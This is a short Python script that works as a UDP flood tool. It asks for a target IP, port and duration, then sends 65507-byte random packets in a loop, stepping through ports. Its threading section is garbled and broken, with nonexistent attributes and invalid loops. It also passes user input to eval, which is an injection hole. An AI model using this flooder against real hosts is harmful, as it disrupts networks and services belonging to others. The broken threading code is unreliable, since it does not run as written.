#!/usr/bin/env python
import sys
import os
import time
import socket
import random
import threading

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65507)

ip = input("Enter IP: \n")
port = eval(input("Port: \n"))
duration = eval(input("Bytes per seconds: \n"))
timeout = time.time() + duration
print()

sent = 0

while True:
    if time.time() > timeout:
        break
    else:
        pass
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("sent %s packet to %s throughout port:%s"%(sent, ip, port))
    if port == 65534:
      port = 1

Threads = []

for ip, port in range(10):
    threading.Threads(target=sock)
    threading.Threads(target=bytes)
    Threads.daemon = True

for ip, port in range(10):
    threading.Threads[(start)]

for ip, port in range(10):
    threading.Threads[(join)]
